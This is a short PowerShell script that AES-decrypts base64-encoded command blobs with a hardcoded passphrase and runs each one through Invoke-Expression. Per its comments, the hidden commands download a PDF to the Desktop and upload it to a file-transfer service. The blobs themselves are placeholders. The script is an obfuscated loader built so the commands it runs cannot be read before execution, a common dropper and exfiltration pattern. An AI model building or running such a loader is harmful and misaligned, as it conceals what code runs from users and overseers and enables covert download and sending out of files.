# first.txt

function Decrypt-String {
    param(
        [string]$CipherTextBase64,
        [string]$Password
    )
    # pad/truncate passphrase to exactly 32 bytes
    $padded   = ($Password.PadRight(32)).Substring(0,32)
    $keyBytes = [System.Text.Encoding]::UTF8.GetBytes($padded)
    $iv       = New-Object byte[] 16

    $cipherBytes = [Convert]::FromBase64String($CipherTextBase64)
    $aes         = [System.Security.Cryptography.Aes]::Create()
    $aes.Mode    = 'CBC'; $aes.Padding = 'PKCS7'
    $aes.Key     = $keyBytes;      $aes.IV      = $iv

    $decryptor = $aes.CreateDecryptor()
    $ms        = New-Object System.IO.MemoryStream(,$cipherBytes)
    $cs        = New-Object System.Security.Cryptography.CryptoStream(
                     $ms, $decryptor,
                     [System.Security.Cryptography.CryptoStreamMode]::Read
                  )
    $sr    = New-Object System.IO.StreamReader($cs)
    $plain = $sr.ReadToEnd()
    $sr.Close(); $cs.Close(); $ms.Close()
    return $plain
}

$EncryptedCommands = @(
    # ── 1) Download the HIBP PDF to Desktop
    '<PASTE_YOUR_FIRST_BASE64_BLOB_HERE>',
    # ── 2) Upload it via Free Transfert and print the link
    '<PASTE_YOUR_SECOND_BASE64_BLOB_HERE>'
)

$passphrase = 'Junade Ali'
foreach ($b in $EncryptedCommands) {
    # for debugging you can uncomment next line to see the cleartext:
    # Write-Host "DECRYPTED → $([Decrypt-String]::Invoke($b,$passphrase))"
    Invoke-Expression (Decrypt-String $b $passphrase)
}
